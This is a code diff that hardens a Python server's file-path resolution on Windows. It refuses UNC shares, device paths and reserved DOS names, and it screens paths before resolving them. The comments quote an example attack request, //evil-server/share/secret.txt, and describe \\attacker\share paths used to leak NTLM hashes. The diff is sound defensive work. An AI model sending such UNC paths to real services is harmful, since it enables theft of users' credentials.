@@ -7,7 +7,18 @@ that they exist on disk. Used for server-side linkification.
 
 import os
 import re
+import sys
 from pathlib import Path
+
+
+def _is_rooted(name: str) -> bool:
+    """Does this name already say where it lives (no cwd needed)?
+
+    `startswith('/')` was the old test and misses every Windows absolute
+    path (`C:\\...`, `\\\\server\\share`), which made rooted names fall
+    through to the relative-resolution tiers.
+    """
+    return name.startswith('~') or Path(name).is_absolute()
 
 
 # Known file extensions for linkification
@@ -170,7 +181,7 @@ def _normalize_hint_dirs(hints, base: Path) -> list:
         hint = hint.strip().rstrip('/')
         if not hint or hint in ('.', '..', '~') or len(hint) > MAX_PATH_LEN:
             continue
-        hint_dir = Path(hint).expanduser() if hint.startswith(('~', '/')) else base / hint
+        hint_dir = Path(hint).expanduser() if _is_rooted(hint) else base / hint
         try:
             if not hint_dir.is_dir():
                 continue
@@ -189,7 +200,7 @@ def _normalize_hint_dirs(hints, base: Path) -> list:
 def _resolve_direct(name: str, base: Path, hint_dirs: list):
     """Direct (no-walk) resolution tiers: absolute/~ paths, exact
     base/name, hint dirs, then COMMON_SUBDIRS for bare filenames."""
-    if name.startswith('~') or name.startswith('/'):
+    if _is_rooted(name):
         check_path = Path(name).expanduser()
         return str(check_path) if check_path.is_file() else None
 
@@ -340,7 +351,7 @@ def resolve_project_dir(name: str, cwd: str, hints=()):
     if not name or len(name) > MAX_PATH_LEN:
         return None
     try:
-        if name.startswith('~') or name.startswith('/'):
+        if _is_rooted(name):
             check_path = Path(name).expanduser()
             return str(check_path) if check_path.is_dir() else None
         if not cwd:
@@ -466,8 +477,109 @@ _DENY_ROOTS = (
     Path("/dev"),
 )
 
-PATH_DENIED_DETAIL = ("Path not allowed — /proc, /sys and /dev are off limits "
-                      "(kernel-special files, not a security boundary)")
+# Windows equivalents of the kernel-special trees — plus one case that is
+# a genuine security concern rather than a practical one. A UNC path
+# (\\host\share) makes Windows authenticate OUTBOUND to an arbitrary host,
+# so a single "read this file" with a \\attacker\share path turns the
+# bridge into an NTLM-hash exfiltration primitive. Device namespaces
+# (\\.\PhysicalDrive0, \\?\) and the reserved DOS names are the /dev
+# analogue: opening them does something other than read a file.
+_WIN_RESERVED_NAMES = frozenset(
+    {"CON", "PRN", "AUX", "NUL"}
+    | {f"COM{i}" for i in range(1, 10)}
+    | {f"LPT{i}" for i in range(1, 10)}
+)
+
+PATH_DENIED_DETAIL = (
+    ("Path not allowed — UNC shares (\\\\host\\share), device paths "
+     "(\\\\.\\, \\\\?\\) and reserved DOS names are off limits")
+    if sys.platform == "win32" else
+    ("Path not allowed — /proc, /sys and /dev are off limits "
+     "(kernel-special files, not a security boundary)")
+)
+
+
+def is_reserved_dos_name(component: str) -> bool:
+    """Does this single path component address a reserved DOS device?
+
+    Reserved in EVERY directory and with or without an extension —
+    `C:\\tmp\\nul` and `C:\\tmp\\nul.txt` both open the null device — and
+    Windows strips trailing dots and spaces from a component before it
+    resolves the name, so `"nul .txt"` and `"nul. "` are the device too.
+
+    Shared by the read-path screen below and by upload filename
+    sanitization (routes/api_upload.py). It lives here, next to the set it
+    consults, because two copies of "is this a device name" drifted apart
+    once already: the upload copy omitted the rstrip, so `"nul .txt"` was
+    denied as a path to read and accepted as a name to write.
+    """
+    return component.split(".")[0].rstrip(". ").upper() in _WIN_RESERVED_NAMES
+
+
+def _is_windows_path_allowed(resolved: Path) -> bool:
+    """UNC/device/reserved-name rejection for win32."""
+    text = str(resolved)
+    # Both UNC shares and the device namespaces start with two separators.
+    # Path.resolve() normalizes / to \, so one check covers \\ and //.
+    if text.startswith("\\\\"):
+        return False
+    return not any(is_reserved_dos_name(part) for part in resolved.parts)
+
+
+def _lexical_path(p: Path) -> Path:
+    """Absolute, with `..` collapsed, without asking the filesystem anything.
+
+    GetFullPathNameW (what abspath uses on Windows) is a pure string
+    operation — it never verifies the path exists, and never goes to the
+    network for a UNC path.
+    """
+    try:
+        return Path(os.path.abspath(p))
+    except (OSError, ValueError):
+        return Path(os.path.normpath(str(p)))
+
+
+def _resolve_or_lexical(p: Path) -> Path:
+    """`p.resolve()`, degrading to a lexical normalization on OSError.
+
+    Assumes the caller has ALREADY screened `p` — call `safe_resolve`
+    instead unless you are the screen.
+    """
+    try:
+        return p.resolve()
+    except OSError:
+        return _lexical_path(p)
+
+
+def safe_resolve(raw) -> Path:
+    """`expanduser().resolve()` that can't be steered into network I/O or blow up.
+
+    Two Windows hazards, and the plain idiom walks into both:
+
+    1. Canonicalizing a UNC path makes Windows contact the host — offering
+       the logged-in user's credentials to do it. Every caller resolved
+       BEFORE consulting the allow-list, so a request for
+       //attacker/share/x reached out to `attacker` and stalled ~3s before
+       anything decided the path was forbidden. Screening lexically first
+       closes that; the denial now costs no packets.
+
+    2. `resolve()` is nominally non-strict, but ntpath only swallows a fixed
+       set of errors and ERROR_NETNAME_DELETED isn't among them, so an
+       unreachable share raises out of routes that catch only
+       PermissionError. Observed live on the Windows VM against
+       /api/file?path=//evil-server/share/secret.txt:
+           OSError: [WinError 64] The specified network name is no longer
+           available: '\\\\evil-server\\share\\secret.txt'
+       — a 500 with a stack trace where a 403 belonged.
+
+    Denied and unresolvable paths come back lexically normalized rather than
+    raw, so `..` is still collapsed and the caller's containment check stays
+    honest; it just never touches the filesystem to get there.
+    """
+    p = Path(raw).expanduser()
+    if sys.platform == "win32" and not _is_windows_path_allowed(p):
+        return _lexical_path(p)
+    return _resolve_or_lexical(p)
 
 
 def is_path_allowed_for_read(path: Path) -> bool:
@@ -478,7 +590,34 @@ def is_path_allowed_for_read(path: Path) -> bool:
     its OS user can touch, so this doesn't broaden actual access beyond what
     the user already has via their shell.
     """
-    resolved = path.resolve()
+    # Screen before resolving, not after: see safe_resolve. A gate that
+    # resolves first has already made the call it exists to prevent.
+    #
+    # EXACTLY two screens, which is the minimum that is actually sound.
+    # This used to run three — one on the raw path, one inside safe_resolve
+    # on the expanduser'd path, one on the result — and the tempting
+    # simplification is to drop safe_resolve's on the grounds that the raw
+    # pre-check already covered it. It doesn't, and the redundancy runs the
+    # other way: expanduser can only rewrite the FIRST component, and no
+    # denied first component starts with `~`, so anything the raw check
+    # denies the expanded check denies too — while the reverse is false.
+    # `~/x` on a UNC roaming profile (USERPROFILE=\\fileserver\home\alice)
+    # is allowed raw and denied expanded, and only the expanded screen sees
+    # it. So the raw check is the redundant one, and the surviving screen
+    # runs on the expanded path.
+    p = Path(path).expanduser()
+    if sys.platform == "win32":
+        if not _is_windows_path_allowed(p):
+            # Returned directly rather than via safe_resolve's lexical
+            # fallback: that fallback normalizes through os.path.abspath,
+            # and only ntpath keeps a leading `\\` — so leaning on it would
+            # make this denial correct on Windows and quietly wrong
+            # anywhere the platform is simulated or the flavor is mixed.
+            return False
+        # Second screen, on the RESULT: resolve() follows symlinks and
+        # junctions, so an allowed name can land on a UNC or device target.
+        return _is_windows_path_allowed(_resolve_or_lexical(p))
+    resolved = _resolve_or_lexical(p)
     return not any(
         resolved == deny or deny in resolved.parents
         for deny in _DENY_ROOTS
@@ -503,7 +642,7 @@ def resolve_work_dir(cwd: str = None) -> Path:
     Raises HTTPException(403) for the kernel-special trees only.
     """
     from fastapi import HTTPException
-    work_dir = Path(cwd).expanduser().resolve() if cwd else Path.cwd()
+    work_dir = safe_resolve(cwd) if cwd else Path.cwd()
     if not is_path_allowed(work_dir):
         raise HTTPException(status_code=403, detail=PATH_DENIED_DETAIL)
     return work_dir
